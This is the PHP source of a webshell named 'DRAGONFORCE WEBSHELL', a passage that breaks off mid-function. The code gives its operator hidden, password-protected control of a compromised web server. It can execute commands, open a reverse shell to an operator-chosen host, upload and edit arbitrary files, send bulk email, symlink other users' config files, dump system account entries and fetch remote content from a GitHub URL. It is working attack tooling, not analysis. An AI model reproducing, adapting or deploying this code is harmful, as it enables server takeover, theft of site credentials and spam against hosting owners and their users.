<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                               #
#                           DRAGONFORCE WEBSHELL                                #
#                                                                               #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

// creating session

session_start();
$DFShell_Ver = 2.2;
$DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
$DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
$DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
$DFSPlatform = strtolower(substr(PHP_OS,0,3));
$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip","bombing");

#new update will use chdir(); function
#readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function


class DFShell{

    public $string;
    public $query; // 0=path , 1=file

    public $keys = 'EagleEye@DFM';
    private $options=0;
    private $iv="4797450924659018";
    private $ciphering="AES-256-CBC";
    private $iv_length;
    private $output;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;
    private $clen    = 0;       
    private $error   = false;   

    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
    
    public function __construct(){
        $_SESSION['latest'] = $GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt");
        $_SESSION['need_update'] = false;
        if(doubleval($_SESSION['latest'])!==$GLOBALS['DFShell_Ver']){
            $_SESSION['need_update'] = true;
        }
    }

    public function DFSPopupMSG($no,$title,$msg,$foot,$x){
        if($x){
            $location = "window.location.replace(window.location.href)";
        }else{
            $location = "window.history.back()";
        }

        if(isset($GLOBALS['DFConfig'][0]['dfp']) && isset($GLOBALS['DFConfig'][0]['dff'])){
            $slocation = "window.location.replace('?dfp=".$GLOBALS['DFConfig'][0]['dfp']."')";
        }else{
            $slocation = "window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')";
        }

        switch($no){
            case 1:
                $script = "<script>
                Swal.fire({
                    icon: 'info',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 2:
                $script = "<script>
                Swal.fire({
                    icon: 'error',
                    title: '".$title."',
                    text: '".$msg."',
                    footer: '".$foot."'
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 3:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 4:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'error',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                  setTimeout(function(){ ".$location." },1500);
                </script>";
                print($script);
                break;
            case 5:
                $script = "<script>
                Swal.fire({
                    position: 'top-end',
                    icon: 'success',
                    title: '".$msg."',
                    showConfirmButton: false,
                    timer: 2000
                  });
                </script>";
                print($script);
                break;
        }
    }
    function __call($method, $arg){
        if(isset($method) && isset($arg)){
            $arg[0]($arg[1]);
            //upcoming CNC ddos
        }
    }

    private function triggered(){
        print("Place where magic happend!");
    }

    public function Enc()
    {
        $this->iv_length = openssl_cipher_iv_length($this->ciphering);
        $this->output = openssl_encrypt($this->string,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        return $this->output;
    }
    public function Dec($enc)
    {
        $this->output = openssl_decrypt($enc,$this->ciphering,sha1($this->keys),$this->options,$this->iv);
        return $this->output;
    }
    public function DFSLogin($password){
        $login_pass = $this->Dec(urldecode($password));
        if($login_pass === $this->Dec(self::$pass)){
            $_SESSION['DFS_Auth']=sha1($GLOBALS['DFConfig'][2]['REMOTE_ADDR']);
            setrawcookie('DFSVersion',$GLOBALS['DFShell_Ver'],(time()+18000),'/',$GLOBALS['DFConfig'][2]['HTTP_HOST'],1,1);
            return true;
        }else{
            echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
            //echo $login_pass;
            return false;
        }
    }

    public function DFSSlash(){
        if($GLOBALS['DFSPlatform']!=='win'){
            $slashtype = "/";
        }else{
            $slashtype = "\\";
        }
        return $slashtype;
    }

    public function DFSFormat($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' B';
        }
        else
        {
            $bytes = '0 bytes';
        }
        return $bytes;
    }


########## REVERSHELL> CREDIT : https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php #########


    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($GLOBALS['DFSPlatform'] === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($GLOBALS['DFSPlatform'] === 'lin' && $iname === 'STDOUT' && $this->clen) {
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) {
            $this->error = true;
            echo "<br>STRM_ERROR: Cannot read from {$name}, script will now exit...<br>";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) {
            $this->error = true; 
            echo "<br>STRM_ERROR: Cannot write to {$name}, script will now exit...<br>";
        }
        return $bytes;
    }
    public function DFSReverse($ip,$port){
        $exit = false;

        if($GLOBALS['DFSPlatform']!=='lin'){
            $exec = 'cmd.exe';
        }else{
            $exec = '/bin/sh';
        }

        if (!$GLOBALS['DFSyntax'][5]('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...";
        } else if (($pid = @$GLOBALS['DFSyntax'][7]()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...";
        } else if ($GLOBALS['DFSyntax'][12]() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...";
        } else {
            echo "DAEMONIZE: Completed successfully!";
        }

        if(!$exit){
            @set_time_limit(0);
            @umask(0);
            $socket = @$GLOBALS['DFSyntax'][6]($ip, $port, $errno, $errstr, 30);
            if(!$socket){
                echo "Erro Socket! -> {$errno}: {$errstr}";
            }else{
                $GLOBALS['DFSyntax'][8]($socket, false);
                $process = @$GLOBALS['DFSyntax'][10]($exec, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell";
                }else{
                    foreach ($pipes as $pipe) {
                        $GLOBALS['DFSyntax'][8]($pipe, false);
                    }
                    $status = $GLOBALS['DFSyntax'][9]($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = $GLOBALS['DFSyntax'][9]($process);
                        if (feof($socket)) {
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {
                            echo "PROC_ERROR: Shell process has been terminated";   break;
                        }
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @$GLOBALS['DFSyntax'][13]($streams['read'], $streams['write'], $streams['except'], 0);
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($GLOBALS['DFSPlatform'] === 'lin') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            } else if ($GLOBALS['DFSPlatform'] === 'win') {
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                            }
                        }
                    } while (!$this->error);
                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    $GLOBALS['DFSyntax'][11]($process);
                }
                fclose($socket);
            }
        }
    }


####### END REVERSHELL ########

    public function DFSAction($action){
        switch(strtolower($action)){
            case "download":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if( file_exists($pathfile) ){
                    $type = mime_content_type($pathfile) ?: 'text/plain';
                    header("Content-Type: ".$type);
                    header('Content-Description: File Transfer');
                    header("Content-Length: ".filesize($pathfile));
                    header('Content-Disposition: attachment; filename="'.basename($pathfile).'"');
                    $GLOBALS['DFSyntax'][2]($pathfile);
                }else{
                    echo "<script>alert('File not found!');</script>";
                }
            break;
            case "chmd":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                if(isset($this->query)){
                    $dirmod = $this->Dec($this->query[0]);
                    $filmod = "";
                    if(isset($this->query[1])){
                        $filmod = $this->Dec($this->query[1]);
                    }
                    $_cmod = $this->DFSMod(fileperms($dirmod . $filmod));
                    echo "<section class='modarea'><p><font color='white'>Location : </font><font color='#FFD700'>$dirmod$filmod</font></p>";
                    echo "<form action='' method='POST' autocomplete='OFF'>
                    <input type='text' name='modf' placeholder='$_cmod'>
                    <input type='submit' name='cmod' value='Chmod'>
                    </form></section>
                    ";
                    if(isset($GLOBALS['DFConfig'][1]['cmod'])){
                        if($this->DFSChange($dirmod . $filmod,$GLOBALS['DFConfig'][1]['modf'])){
                            echo "<script>alert('Successfully changed!');</script>";
                        }else{
                            echo "<script>alert('An error occured!');</script>";
                        }
                    }
                }
            break;
            case "bombing":

                echo "<div class='bombing'>
                <h3>Email Bombing</h3>
                <form action='' method='POST'>
                <table>
                    <tr>
                        <td colspan='2'><input type='text' name='mail_subject' placeholder='Subject'></td>
                    </tr>
                    <tr>
                        <td><textarea name='mail_list' placeholder='email@list.com'></textarea></td>
                        <td><textarea name='mail_text' placeholder='Message Text'></textarea></td>
                    </tr>
                    </tr>
                        <td colspan='2'><button>SEND MAIL</button></td>
                    </tr>
                </table>
                </form>
                ";

                if(isset($GLOBALS['DFConfig'][1]['mail_list']) && isset($GLOBALS['DFConfig'][1]['mail_text'])){
                    $emails = explode("\n",$GLOBALS['DFConfig'][1]['mail_list']);
                    $message = $GLOBALS['DFConfig'][1]['mail_text'];
                    $subject = $GLOBALS['DFConfig'][1]['mail_subject'];
                    $headers = "From: ".$GLOBALS['DFConfig'][2]['SERVER_ADMIN'];
                    foreach($emails as $email){
                        $email = preg_replace("/\s+/i","",$email);
                        if(@mail($email,$subject,$message,$headers)){
                            print("<font color='green'>Email sent -> ".$email."</font><br>");
                        }else{
                            print("<font color='red'>Failed -> ".$email."</font><br>");
                        }
                    }
                }
                echo "</div>";
            break;
            case "massdel":
                //upcoming
                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
                    if($GLOBALS['DFConfig'][1]['selectAction']==="Delete")
                    if(!empty($GLOBALS['DFConfig'][1]['toZip'])){

                        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
                            $delPath = $this->Dec($GLOBALS['DFConfig'][0]['dfp']) . $slashtype;
                        }else{
                            $delPath = "";
                        }

                        $toDel = $GLOBALS['DFConfig'][1]['toZip'];

                        for($i=0;$i<count($toDel);$i++){
                            $mdel = explode("||",$toDel[$i]);
                            $mdel_dir = $this->Dec(urldecode($mdel[0]));
                            $mdel_item = $this->Dec(urldecode($mdel[1]));
                            if(file_exists($mdel_dir . $mdel_item)){
                                if(is_dir($mdel_dir . $mdel_item)){
                                    @rmdir($mdel_dir . $mdel_item);
                                }
                                if(is_file($mdel_dir . $mdel_item)){
                                    @unlink($mdel_dir . $mdel_item);
                                }
                            }
                        }
                        $this->DFSPopupMSG(3,null,"Selected file deleted!",null,true);
                    }else{
                        $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                    }
                }
            break;
            case "zipping":
                $ziproc = new ZipArchive;
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['selectAction'])){
                    if($GLOBALS['DFConfig'][1]['selectAction']==="Zip")
                    if(empty($GLOBALS['DFConfig'][1]['toZip'])){
                        print("<script>alert('You have to pick a file');</script>");
                    }else{
                        $toZip = $GLOBALS['DFConfig'][1]['toZip'];
                        $zipXname = md5(time()) . ".zip";
                        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
                            $zipdirname = $this->Dec($GLOBALS['DFConfig'][0]['dfp']) . $slashtype . $zipXname;
                        }else{
                            $zipdirname = $zipXname;
                        }
                        if($ziproc -> open($zipdirname, ZipArchive::CREATE | ZipArchive::OVERWRITE)){
                            for($i=0;$i<count($toZip);$i++){
                                $mzip = explode("||",$toZip[$i]);
                                if(($mzip[1])==="[novalue]"){
                                    $dirtozip = $this->Dec(urldecode($mzip[0])) . $slashtype;
                                    $recdir = new RecursiveIteratorIterator(
                                        new RecursiveDirectoryIterator($dirtozip),
                                        RecursiveIteratorIterator::LEAVES_ONLY
                                    );
                                    foreach ($recdir as $name => $file)
                                    {
                                        if (!$file->isDir())
                                        {
                                            $filePath = $file->getRealPath();
                                            $relativePath = substr($filePath, strlen($dirtozip));
                                            $ziproc->addFile($filePath, $relativePath);
                                        }
                                    }

                                }else{
                                    $filetozip = $this->Dec(urldecode($mzip[0])) . $slashtype . $this->Dec(urldecode($mzip[1]));
                                    $ziproc->addFile($filetozip,$this->Dec(urldecode($mzip[1])));
                                }
                            }
                            echo "<script>alert('saved as $zipXname');window.location.replace(window.location.href);</script>";
                            $ziproc ->close();
                        }

                    }
                }
            break;
            case "upload":
                $slashtype = $this->DFSSlash();
                if(!isset($this->query[0])){
                    $path = getcwd() . $slashtype;
                }else{
                    $path = $this->Dec(($this->query[0])) ?: getcwd() . $slashtype;
                }
                $path = $this->Dec($this->DFSDirFilter($path)) . $slashtype;
                if(isset($GLOBALS['DFConfig'][1]['dfupload'])){
                    if(move_uploaded_file($GLOBALS['DFConfig'][4]['dffile']['tmp_name'],$path.$GLOBALS['DFConfig'][4]['dffile']['name'])){
                        $this->DFSPopupMSG(3,null,"File uploaded!",null,true);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                    }
                }

            break;
            case "dest":
                $slashtype = $this->DFSSlash();
                if(!isset($GLOBALS['DFConfig'][1]['destroy'])){
                    echo "<section id='destroyer'><form action='' method='POST'>";
                    echo "<input type='submit' name='destroy' value='Remove this shell'/></section></form>";
                }else{
                    $DFS_SHELL = $GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] . $slashtype . $GLOBALS['DFConfig'][2]['PHP_SELF'];
                    if(unlink($DFS_SHELL)){
                        $this->DFSPopupMSG(3,null,"File destroyed!!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Unable destroyed!!",null,true);
                    }
                }
            break;
            case "edit":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(!isset($GLOBALS['DFConfig'][1]['dfedit'])){
                    echo "<section class='editform'>";
                    echo "<form action='' method='POST'>";
                    echo "<textarea class='editcontent' name='editx'>";
                    echo htmlspecialchars($GLOBALS['DFSyntax'][0]($pathfile));
                    echo "</textarea>";
                    echo "<input type='submit' name='dfedit' value='Save'>";
                    echo "</form></section>";
                }else{
                    $pto = fopen($pathfile,'w');
                    fwrite($pto,$GLOBALS['DFConfig'][1]['editx']);
                    fclose($pto);
                    $this->DFSPopupMSG(3,null,"Saved!",null,true);
                }
            break;
            case "view":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                echo "<p id='sshows'><span id='fnameshow'>Filename -> </span><span id='fnameshow1'>".$this->Dec(($this->query[1]))."</span></p>";
                echo "<section class='sources'>";
                show_source($pathfile);
                echo "</section><div id='buttontoedit'>
                <a href='?dfp=".urlencode($this->query[0])."&dff=".urlencode($this->query[1])."&dfaction=edit'>
                <button>Edit</button></a></div>";

            break;
            case "mkfile":
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['createfile'])){
                    $fname = $GLOBALS['DFConfig'][1]['newfile'] ?: 'newfile.txt';
                    $fcreate = fopen($this->Dec(($this->query[0])).$slashtype.$fname,'w');
                    fwrite($fcreate,"");
                    fclose($fcreate);
                    $this->DFSPopupMSG(3,null,"File created!",null,true);
                }
            break;
            case "mkdir":
                $slashtype = $this->DFSSlash();
                if(isset($GLOBALS['DFConfig'][1]['createfolder'])){
                    $fname = $GLOBALS['DFConfig'][1]['newfolder'] ?: 'newfolder';
                    if(!file_exists($fname)){
                        if(mkdir($this->Dec(($this->query[0])).$slashtype.$fname)){
                            $this->DFSPopupMSG(3,null,"Folder created!",null,true);
                        }else{
                            $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->DFSPopupMSG(4,null,"Folder existed!",null,true);
                    }
                }
            break;
            case "cmd":
                $slashtype = $this->DFSSlash();
                $this->DFSCurrent($slashtype);
                echo "<section id='cmd_area'>";
                echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && !empty($GLOBALS['DFConfig'][1]['dfscmd'])){
                   $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
                }
                echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>Execute</button></form>";
                echo "</section>";
            break;
            case "sym":
                echo "<section class='symlinkarea'><div class='symex'><label>Example : /home/%{user}%/public_html/target_file.php || /var/www/%{user}%/html/file.php</label></div>";
                echo "<table><form action='' method='POST'>";
                echo "<input type='hidden' name='dfssym'><br>";
                echo "<tr><td id='symlable' class='symex1'><label>Symlink home&file target : </label></td><td id='symlable'><input type='text' name='target' placeholder='/path/%{user}%/path/file.php'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved to path : </label></td><td id='symlable'><input type='text' name='path' placeholder='path/'></td></tr>";
                echo "<tr><td id='symlable' class='symex1'><label>Saved as : </label></td><td id='symlable'><input type='text' name='dfsaved' placeholder='wp-config.txt'></td></tr>";
                echo "<tr><td id='symlable'></td><td id='symlable'><button>Symlink</button></td></tr></form></table><div class='sym_response'>";
                if(isset($GLOBALS['DFConfig'][1]['dfssym'])){
                    if($GLOBALS['DFSPlatform']!=='win'){
                        if(!file_exists('sym')) { mkdir($GLOBALS['DFConfig'][1]['path'].'/sym'); }
                        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/htaccess.txt");
                        for ($uid = 0; $uid < 4000; $uid++){ 
                            $nothing = posix_getpwuid($uid);
                            if (!empty($nothing)){ 
                                if(!file_exists($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'])){
                                    mkdir($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name']);

                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],base64_decode(urldecode($GLOBALS['DFConfig'][1]['target'])));

                                    if(isset($targetpath)){
                                        $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
                                        symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
    
                                        $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
                                        fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
                                        fclose($user_ht);
    
                                        $dfsv = urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
                                    }
                                }else{
                                    $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],base64_decode(urldecode($GLOBALS['DFConfig'][1]['target'])));

                                    if(isset($targetpath)){
                                        $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
                                        symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
    
                                        $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
                                        fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
                                        fclose($user_ht);
    
                                        $dfsv = urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
                                    }
                                }
                            }
                        }
                    }else{
                        echo "<center><font color='red' size='6'><code>Not work in window!</code></font></center>";
                    }
                }
                echo "</div></section>";

            break;
            case "reverse":
                $revhtml = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[1];
                echo "<section class='reverse'>";
                if(!isset($GLOBALS['DFConfig'][1]['dfsrev'])){
                    echo $revhtml;
                }else{
                    echo $revhtml;
                    echo "<code>";
                    $addr = trim($GLOBALS['DFConfig'][1]['dfsaddr']);
                    $port = trim($GLOBALS['DFConfig'][1]['dfsport']);
                    $this->DFSReverse($addr,$port);
                    echo "</code>";
                }
                echo "</section>";
            break;
            case "conf":
                echo "<section class='configs'>";
                $pwid = array();
                if($GLOBALS['DFSPlatform']!=='win'){
                    for ($uid = 0; $uid < 4000; $uid++){ 
                        $nothing = posix_getpwuid($uid);
                        if (!empty($nothing)){ 
                            array_push($pwid,$nothing['name'].':'.$nothing['passwd'].':'.$nothing['uid'].':'.$nothing['gid'].':'.$nothing['dir'].':'.$nothing['shell']);
                        }
                    }
                    foreach($pwid as $conf){
                        print($conf."<br>");
                    }
                }else{
                    echo "<center>Not work in window!</center>";
                }
                echo "</section>";
            break;
            case "unzip":
                $from = $this->Dec($GLOBALS['DFConfig'][0]['dfp']);
                $zipp = $this->Dec($GLOBALS['DFConfig'][0]['dff']);
                echo "<section id='unzipping'>";
                if(isset($GLOBALS['DFConfig'][1]['destination'])){
                    $ziproc = new ZipArchive;
                    $pth = $from.$zipp;
                    if ($ziproc->open($pth) === TRUE) {
  
                        // Unzip Path
                        $ziproc->extractTo($GLOBALS['DFConfig'][1]['destination']);
                        $ziproc->close();
                        $this->DFSPopupMSG(3,null,"File successfully extracted to destination!",null,false);
                    } else {
                        $this->DFSPopupMSG(4,null,"Failed to extract into destination!",null,false);
                    }
                }else{
                    echo "<center><font color='white'>Filename : ".$from.$zipp."</font>";
                    echo "<table><form action='' method='POST'><tr><td><label>Destination : </label></td>";
                    echo "<td><input type='text' name='destination'></td></tr><tr><td></td><td><button>Unzip</button></td>";
                    echo "</form></table></center>";
                }
                echo "</section>";
            break;
            case "scand":
                $slashtype = $this->DFSSlash();
                $path = $this->Dec(($this->query[0])). $slashtype;
                $path = $this->Dec($this->DFSDirFilter($path));
                $this->DFSCurrent($slashtype);
                echo "<div class='directory'><form action='' method='POST'>";
                echo "<table><th>Pick</th><th>Type</th><th>Name</th><th>Size</th><th>Owner:Groups</th><th>Perms</th><th>Modified</th><th>Action</th>";
                $folder = array_diff(scandir($path),['.','..']);
                $files = scandir($path);

                foreach($folder as $p){
                    if(is_dir($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->DFSDirFilter($path));
                        $this->string = $filtered . $p;

                        $uid = explode(':',$this->DFSOG($filtered.$slashtype.$p));
                        //$og = posix_getpwuid($uid[0]);

                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($this->Enc())."||[novalue]'></td></td>";
                        echo "<td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?dfp=".urlencode($this->Enc())."'>$p</a></td>";
                        echo "<td></td>";
                        echo "<td id='tbcen'>".$this->DFSOG($filtered . $slashtype . $p)."</td>";
                        echo "<td id='tbcen'><a href='?dfp=".urlencode($this->Enc())."&dfaction=chmd'>".$this->DFSPerms($filtered . $slashtype . $p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered . $slashtype . $p))."</td>";
                        echo "<td id='tbcen'> <a href='?dfp=".urlencode($this->Enc())."&dfaction=ren'><i class='fa-solid fa-pen'></i></a>. 
                        <a href='?dfp=".urlencode($this->Enc())."&dfaction=del'><i class='fa-solid fa-trash'></i></a></td></tr></p>";

                    }
                }
                foreach($files as $p){
                    if(is_file($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->DFSDirFilter($path));
                        $this->string = $filtered;
                        $dfp = $this->Enc();
                        $this->string = $p;
                        $dff = $this->Enc();
                        $compressed = array("zip","tar","gz","rar");
                        $isZip = pathinfo($p,PATHINFO_EXTENSION);
                        if(in_array($isZip,$compressed)){
                            $tname = $p . "<button style='border-radius:8px;background:orange;'>
                            <a style='color:black;' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip'>
                             UNZIP </a></button>";
                        }else{
                            $tname = $p;
                        }

                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($dfp)."||".urlencode($dff)."'></td></td>";
                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$tname</a></td>";
                        echo "<td>".$this->DFSFormat(filesize($filtered.$p))."</td>";
                        echo "<td id='tbcen'>".$this->DFSOG($filtered.$p)."</td>";
                        echo "<td id='tbcen'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=chmd'>".$this->DFSPerms($filtered.$p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered.$p))."</td>";
                        echo "<td id='tbcen'>
                        <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=edit'><i class='fa-solid fa-file-signature'></i></a> . 
                        <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=ren'><i class='fa-solid fa-pen'></i></a> . 
                        <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=del'><i class='fa-solid fa-trash'></i></a> . 
                        <a href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
                    }
                }
                echo "</table>
                <div id='anact'>

                <select name='selectAction'>
                <option value=''>-- Action --</option>
                <option value='Zip'>-- Zip --</option>
                <option value='Delete'>-- Delete --</option>
                </select>
                <input type='submit' value='Submit'>
                </div></form></div>";

            break;
            case "del":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]?:''));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(is_file($pathfile)){
                    if(unlink($pathfile)){
                        $this->DFSPopupMSG(3,null,"File Successfully deleted!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }else if(is_dir($pathfile)){
                    if(rmdir($pathfile)){
                        $this->DFSPopupMSG(3,null,"Directory Successfully deleted!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }
            break;
            case "ren":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(getcwd()==$pathfile){
